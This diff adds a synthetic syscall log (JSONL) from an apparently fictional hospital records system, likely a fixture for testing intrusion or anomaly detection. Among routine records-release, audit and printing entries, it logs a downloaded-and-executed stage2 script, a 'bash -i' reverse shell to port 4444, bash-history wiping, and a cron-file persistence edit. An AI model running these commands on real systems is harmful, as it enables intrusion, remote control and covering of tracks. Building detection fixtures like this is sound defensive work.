@@ -1,0 +1,34 @@
+{"marker": "LOGGING_START", "timestamp": 1789951800.0}
+{"pid": 0, "ppid": 0, "uid": 0, "timestamp": 5000000000000, "comm": "clock_anchor", "syscall": "clock_nanosleep", "arg": ""}
+{"pid": 20015, "ppid": 20014, "uid": 0, "timestamp": 5016199999809, "comm": "python3", "syscall": "execve", "arg": "python3 -c import socket; s=socket.socket(); s.connect(('192.168.14.22', 8443))"}
+{"pid": 20015, "ppid": 20014, "uid": 0, "timestamp": 5016799999714, "comm": "python3", "syscall": "connect", "arg": "", "dest_ip": "192.168.14.22", "dest_port": 8443}
+{"pid": 20016, "ppid": 20015, "uid": 0, "timestamp": 5017399999619, "comm": "curl", "syscall": "execve", "arg": "curl -s http://192.168.14.22:8080/stage2.sh -o /tmp/.stage2.sh"}
+{"pid": 20016, "ppid": 20015, "uid": 0, "timestamp": 5017400999546, "comm": "curl", "syscall": "connect", "arg": "", "dest_ip": "192.168.14.22", "dest_port": 8080}
+{"pid": 20017, "ppid": 20016, "uid": 0, "timestamp": 5017999999523, "comm": "bash", "syscall": "execve", "arg": "bash /tmp/.stage2.sh"}
+{"pid": 20001, "ppid": 20000, "uid": 0, "timestamp": 6505000999928, "comm": "curl", "syscall": "execve", "arg": "curl -sX POST https://claims.clearinghouse-partner.example.net/submit -d @-"}
+{"pid": 20001, "ppid": 20000, "uid": 0, "timestamp": 6505002000093, "comm": "curl", "syscall": "connect", "arg": "", "dest_ip": "203.0.113.77", "dest_port": 443}
+{"pid": 20003, "ppid": 20002, "uid": 0, "timestamp": 10406000999928, "comm": "curl", "syscall": "execve", "arg": "curl -sX POST https://ingest.deid-partner.example.org/sync -d @-"}
+{"pid": 20003, "ppid": 20002, "uid": 0, "timestamp": 10406002000093, "comm": "curl", "syscall": "connect", "arg": "", "dest_ip": "203.0.113.44", "dest_port": 443}
+{"pid": 20007, "ppid": 20006, "uid": 0, "timestamp": 14015000000000, "comm": "audit_logger", "syscall": "execve", "arg": "audit_logger --write /var/log/him_audit/2026-09-21_D-05_phi.log"}
+{"pid": 20007, "ppid": 20006, "uid": 0, "timestamp": 14020000000000, "comm": "audit_logger", "syscall": "openat", "arg": "/var/log/him_audit/2026-09-21_D-05_phi.log"}
+{"pid": 20020, "ppid": 20019, "uid": 0, "timestamp": 14915000000000, "comm": "bash", "syscall": "execve", "arg": "bash -i"}
+{"pid": 20020, "ppid": 20019, "uid": 0, "timestamp": 14915500000000, "comm": "bash", "syscall": "connect", "arg": "", "dest_ip": "10.77.4.9", "dest_port": 4444}
+{"pid": 20028, "ppid": 20027, "uid": 0, "timestamp": 15504000000000, "comm": "bash", "syscall": "execve", "arg": "bash -c history -c"}
+{"pid": 20028, "ppid": 20027, "uid": 0, "timestamp": 15506000000000, "comm": "bash", "syscall": "unlink", "arg": "/home/nurse_svc/.bash_history"}
+{"pid": 20022, "ppid": 20021, "uid": 0, "timestamp": 17002000000000, "comm": "bash", "syscall": "execve", "arg": "bash -c echo svc_shadow_admin >> /etc/cron.d/pg_backup"}
+{"pid": 20022, "ppid": 20021, "uid": 0, "timestamp": 17003000000000, "comm": "bash", "syscall": "openat", "arg": "/etc/cron.d/pg_backup"}
+{"pid": 20030, "ppid": 20029, "uid": 0, "timestamp": 38906000000000, "comm": "python3", "syscall": "execve", "arg": "python3 /opt/him/enterprise_census.py --depts D-02,D-07 --out /var/reports/census_2026Q3.csv"}
+{"pid": 20030, "ppid": 20029, "uid": 0, "timestamp": 38909000000000, "comm": "python3", "syscall": "openat", "arg": "/var/reports/census_2026Q3.csv"}
+{"pid": 20009, "ppid": 20008, "uid": 0, "timestamp": 74912000000000, "comm": "curl", "syscall": "execve", "arg": "curl -sX POST https://casemgmt.hospital-internal.example/release -d @/tmp/release_91027.json"}
+{"pid": 20009, "ppid": 20008, "uid": 0, "timestamp": 74912000999928, "comm": "curl", "syscall": "connect", "arg": "", "dest_ip": "10.30.0.9", "dest_port": 443}
+{"pid": 20024, "ppid": 20023, "uid": 0, "timestamp": 81506000000000, "comm": "lp", "syscall": "execve", "arg": "lp -d pharmacy_printer /tmp/rx_60318.pdf"}
+{"pid": 20024, "ppid": 20023, "uid": 0, "timestamp": 81508000000000, "comm": "lp", "syscall": "unlink", "arg": "/tmp/rx_60318.pdf"}
+{"pid": 20005, "ppid": 20004, "uid": 0, "timestamp": 83606000999928, "comm": "gzip", "syscall": "execve", "arg": "gzip > /var/audit/phi_release_d09_2026.csv.gz"}
+{"pid": 20005, "ppid": 20004, "uid": 0, "timestamp": 83606002000093, "comm": "gzip", "syscall": "openat", "arg": "/var/audit/phi_release_d09_2026.csv.gz"}
+{"pid": 20011, "ppid": 20010, "uid": 0, "timestamp": 85412000000000, "comm": "python3", "syscall": "execve", "arg": "python3 /opt/him/package_release.py --patient 58231 --case LEGAL-2026-0417"}
+{"pid": 20012, "ppid": 20011, "uid": 0, "timestamp": 85416000000000, "comm": "bash", "syscall": "execve", "arg": "bash -c cat /tmp/release_58231.json >> /var/log/him_audit/record_release_58231.log"}
+{"pid": 20012, "ppid": 20011, "uid": 0, "timestamp": 85420000000000, "comm": "bash", "syscall": "openat", "arg": "/var/log/him_audit/record_release_58231.log"}
+{"pid": 20032, "ppid": 20031, "uid": 0, "timestamp": 87207000000000, "comm": "bash", "syscall": "execve", "arg": "bash -c cat /tmp/handoff_draft.txt >> /var/log/oncall/handoff_2026-09-21.log"}
+{"pid": 20032, "ppid": 20031, "uid": 0, "timestamp": 87210500000000, "comm": "bash", "syscall": "openat", "arg": "/var/log/oncall/handoff_2026-09-21.log"}
+{"pid": 20026, "ppid": 20025, "uid": 0, "timestamp": 88105000000000, "comm": "gzip", "syscall": "execve", "arg": "gzip -f /tmp/billing_export.csv"}
+{"pid": 20026, "ppid": 20025, "uid": 0, "timestamp": 88107500000000, "comm": "gzip", "syscall": "unlink", "arg": "/tmp/billing_export.csv.gz"}
